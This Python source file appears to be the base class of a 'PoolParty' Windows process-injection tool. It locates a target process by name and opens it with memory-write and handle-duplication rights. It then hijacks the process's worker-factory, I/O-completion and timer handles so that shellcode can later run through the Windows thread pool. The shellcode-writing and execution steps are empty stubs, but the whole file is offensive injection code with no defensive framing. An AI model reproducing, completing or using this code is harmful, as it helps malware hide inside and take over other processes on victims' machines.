from winapi import *
import logging
from write_shellcode import *

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s',
                    filename='app.log', filemode='w', encoding='utf-8')

PROCESS_HANDLE_INFORMATION = 0x33  # type PROCESSINFOCLASS
ObjectTypeInformation = 0x2
WorkerFactoryBasicInformation = 0x7
FileReplaceCompletionInformation = 61
JobObjectAssociateCompletionPortInformation = 0x7
IO_COMPLETION_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0x3
WORKER_FACTORY_ALL_ACCESS = 0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x00010 | 0x00020
TIMER_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0x0001 | 0x0002
IO_COMPLETION_OBJECT_NAME = "IoCompletion"
TP_WORKER_FACTORY_OBJECT_NAME = "TpWorkerFactory"
TIMER_OBJECT_NAME = "IRTimer"
SIZE_OF_FULL_TP_WAIT_STRUCT = 0x1D8
SIZE_OF_TP_DIRECT_STRUCT = 0x48
OFFSET_TPWAIT_DIRECT = 0x188
OFFSET_TPWAIT_WAITPKT = 0x170
SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT = 0x78
WorkerFactoryThreadMinimum = 0x4
SIZE_OF_FULL_TP_POOL_STRUCT = 0x1D8
SIZE_OF_FULL_TP_WORK_STRUCT = 0xF0
SIZE_OF_FULL_TP_ALPC_STRUCT = 0x128
SIZE_OF_ALPC_MESSAGE_STRUCT = 0x410
SIZE_OF_PORT_MESSAGE_STRUCT = 0x28
SIZE_OF_FULL_TP_JOB_STRUCT = 0x128
SIZE_OF_FULL_TP_TIMER_STRUCT = 0x168
SIZE_OF_TP_DIRECT_STRUCT = 0x48
POOL_PARTY_FILE_NAME = LPCWSTR("PoolParty.txt")
POOL_PARTY_POEM = ("Dive right in and make a splash,\nWe're throwing a pool party in a flash!\nBring your swimsuits "
                   "and sunscreen galore,\nWe'll turn up the heat and let the good times pour!\n")
POOL_PARTY_POEM_BYTES = POOL_PARTY_POEM.encode('utf-8')
POOL_PARTY_ALPC_PORT_NAME = "\\RPC Control\\PoolPartyALPCPort"
AlpcAssociateCompletionPortInformation = 2
POOL_PARTY_JOB_NAME = "PoolPartyJobObject"
def convert_buffer_to_struct(buffer, struct_type, offset):
    ptr = ctypes.cast(buffer, ctypes.c_void_p).value + offset  # pointer
    return ctypes.cast(ptr, ctypes.POINTER(struct_type)).contents


class PoolParty:
    def __init__(self, process_name):
        self.process_name = process_name
        self.process_handle = HANDLE(0)

    def get_process_handle_by_name(self):
        process_entry_32w = PROCESSENTRY32W()
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot is None:
            logging.error("[x] Cannot retrieve the processes snapshot")
            return False
        if Process32FirstW(snapshot, ctypes.byref(process_entry_32w)):
            while True:
                if process_entry_32w.szExeFile == self.process_name:
                    process_handle = OpenProcess(
                        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                        False, process_entry_32w.th32ProcessID)
                    if process_handle is not None:
                        logging.info(f"[+] Found the process with handle: {process_handle}")
                        self.process_handle = process_handle
                        return True

                if not Process32NextW(snapshot, ctypes.POINTER(PROCESSENTRY32W)(process_entry_32w)):
                    break
        logging.info("[x] Cannot open process to get handle")
        return False

    def hijack_process_handle(self, object_type, desired_access: DWORD):
        return_length = ULONG(0)
        information_buffer = (ctypes.c_ubyte * return_length.value)()
        while True:
            ctypes.resize(information_buffer, return_length.value)
            nt_status = NtQueryInformationProcess(self.process_handle, PROCESS_HANDLE_INFORMATION,
                                                  POINTER(ctypes.c_ubyte)(information_buffer), return_length,
                                                  POINTER(ULONG)(return_length))
            if nt_status != 0xC0000004:
                break

        snapshot_information = PROCESS_HANDLE_SNAPSHOT_INFORMATION.from_buffer(information_buffer)
        # Calculator pointer to PROCESS_HANDLE_TABLE_ENTRY_INFO struct
        duplicate_handle = HANDLE(0)
        for i in range(snapshot_information.number_of_handles):
            # Cast buffer to structure type PROCESS_HANDLE_TABLE_ENTRY_INFO
            process_information = convert_buffer_to_struct(information_buffer, PROCESS_HANDLE_TABLE_ENTRY_INFO,
                                                           16 + sizeof(
                                                               PROCESS_HANDLE_TABLE_ENTRY_INFO) * i)  # 16 is x2 sizeof ULONG in struct
            if not DuplicateHandle(self.process_handle, process_information.handle_value,
                                   GetCurrentProcess(), POINTER(HANDLE)(duplicate_handle), desired_access, False, 0):
                continue
                # return False #return with failed in Windows 11

            return_length = ULONG(0)
            object = (ctypes.c_ubyte * return_length.value)()
            while True:
                ctypes.resize(object, return_length.value)
                nt_status = NtQueryObject(duplicate_handle, ObjectTypeInformation, POINTER(ctypes.c_ubyte)(object),
                                          return_length, POINTER(ULONG)(return_length))
                if nt_status != 0xC0000004:
                    break

            object_information = PUBLIC_OBJECT_TYPE_INFORMATION.from_buffer(object)
            if ctypes.wstring_at(object_information.type_name.buffer) == object_type:
                logging.info("[+] Found object type {}".format(object_type))
                break

        logging.info("[+] Duplicate Handle Success {}".format(duplicate_handle))
        return duplicate_handle

    def hijack(self):
        pass

    def write_shellcode_to_pool(self):
        pass

    def setup_execute(self):
        pass

    def inject(self):
        return self.get_process_handle_by_name() and self.hijack() and self.write_shellcode_to_pool() and self.setup_execute()
